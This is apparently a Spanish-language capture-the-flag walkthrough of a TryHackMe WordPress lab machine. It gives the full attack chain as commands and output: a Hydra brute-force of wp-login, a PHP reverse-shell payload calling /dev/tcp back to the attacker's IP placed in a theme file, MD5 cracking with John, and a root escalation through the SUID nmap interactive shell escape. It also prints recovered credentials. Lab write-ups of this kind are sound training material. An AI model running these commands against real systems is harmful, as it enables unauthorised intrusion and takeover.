
## 📊 Información de la máquina

| Campo             | Valor                                              |
| ----------------- | -------------------------------------------------- |
| Plataforma        | TryHackMe                                          |
| Dificultad        | Intermediate                                       |
| Sistema Operativo | Linux (Bitnami WordPress)                          |
| Tipo              | Boot2Root                                          |
| Vector de ataque  | Web (WordPress) → Brute Force → RCE → PrivEsc SUID |

---

## 🎯 Objetivo

Comprometer la máquina y obtener:

- key-1-of-3
    
- key-2-of-3
    
- key-3-of-3 (root)
    

---

# 🔎 1. Enumeración inicial

## 🔹 Escaneo con Nmap

```bash
nmap -sC -sV 10.130.136.223
```

### Resultado:

```
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

📌 Conclusión:

- Superficie de ataque web → vector principal
    

---

# 🌐 2. Análisis Web

Al acceder a la web:

- Interfaz tipo terminal (fake shell)
    
- No ejecuta comandos reales
    

📌 Conclusión:  
→ Distracción, no es vector de ataque

---

## 🔹 robots.txt

```bash
curl http://10.130.136.223/robots.txt
```

### Output real:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

---

## 🔑 Obtener key-1

```bash
curl http://10.130.136.223/key-1-of-3.txt
```

✔ Primera flag obtenida

---

## 📥 Descargar diccionario

```bash
wget http://10.130.136.223/fsocity.dic
```

---

# 🔐 3. WordPress Enumeration

Acceso identificado:

```
/wp-login
```

---

## 🔍 Usuario válido

Se prueba:

```
elliot
```

### Respuesta:

```
ERROR: The password you entered for the username elliot is incorrect
```

📌 Conclusión:  
→ Usuario válido confirmado

---

# 💣 4. Fuerza bruta

## 🔧 Optimización de diccionario

```bash
sort fsocity.dic | uniq > clean.txt
```

---

## ⚔️ Ataque con Hydra

```bash
hydra -l elliot -P clean.txt 10.130.136.223 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered"
```

### Output real:

```
[80][http-post-form] host: 10.130.136.223   login: elliot   password: ER28-0652
```

✔ Credenciales válidas

---

# 🔓 5. Acceso a WordPress

Panel:

```
/wp-admin
```

---

# 💥 6. Remote Code Execution (RCE)

## 🔧 Método: Theme Editor

Ruta:

```
Appearance → Editor → 404.php
```

---

## 🧬 Payload reverse shell

```php
<?php
exec("bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
?>
```

---

## 🎧 Listener

```bash
nc -lvnp 4444
```

---

## 🚀 Trigger

```
http://10.130.136.223/thispagedoesnotexist
```

---

## 💻 Shell obtenida

```
daemon@ip-10-130-136-223:/opt/bitnami/apps/wordpress/htdocs$
```

✔ Acceso inicial conseguido

---

# 🛠️ 7. Post-Explotación

## 🔍 Enumeración

```bash
ls /home
```

### Output real:

```
robot
ubuntu
```

---

## 📂 Acceso a robot

```bash
cd /home/robot
ls
```

### Output real:

```
key-2-of-3.txt
password.raw-md5
```

---

## ❌ Problema de permisos

```
cat key-2-of-3.txt
Permission denied
```

📌 Necesario escalar privilegios

---

# 🔑 8. Crackeo de hash

## 📄 Obtener hash

```bash
cat password.raw-md5
```

### Hash real:

```
c3fcd3d76192e4007dfb496cca67e13b
```

---

## 🔓 Crack con John

```bash
john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Output real:

```
abcdefghijklmnopqrstuvwxyz
```

---

# 👤 9. Escalada a robot

```bash
su robot
```

Password:

```
abcdefghijklmnopqrstuvwxyz
```

---

## ✅ Verificación

```bash
whoami
```

```
robot
```

---

## 🏁 Obtener key-2

```bash
cat key-2-of-3.txt
```

---

# 💣 10. Privilege Escalation (ROOT)

## 🔍 Enumeración SUID

```bash
find / -perm -4000 2>/dev/null
```

### Output relevante:

```
/usr/local/bin/nmap
```

---

## 🚀 Explotación

```bash
/usr/local/bin/nmap --interactive
```

Dentro:

```bash
!sh
```

---

## 💥 ROOT obtenido

```
root@ip-10-130-136-223#
```

---

# 🏁 11. Obtener key-3

```bash
cd /root
cat key-3-of-3.txt
```

---

# 🧠 Conclusiones

## 🔑 Técnicas utilizadas

- Enumeración (Nmap)
    
- Análisis web
    
- robots.txt discovery
    
- Fuerza bruta (Hydra)
    
- WordPress exploitation
    
- Reverse shell
    
- Hash cracking (John)
    
- Privilege escalation (SUID abuse)
    

---

## ⚠️ Lecciones clave

- robots.txt puede contener información crítica
    
- WordPress es un vector común de ataque
    
- Las reverse shells requieren contexto correcto (404 trigger)
    
- Los binarios SUID mal configurados son críticos
    
- Siempre mejorar la TTY en shells remotas
    

---

## 🏆 Estado final

✔ Máquina comprometida  
✔ Usuario robot obtenido  
✔ Root obtenido  
✔ Todas las flags capturadas

---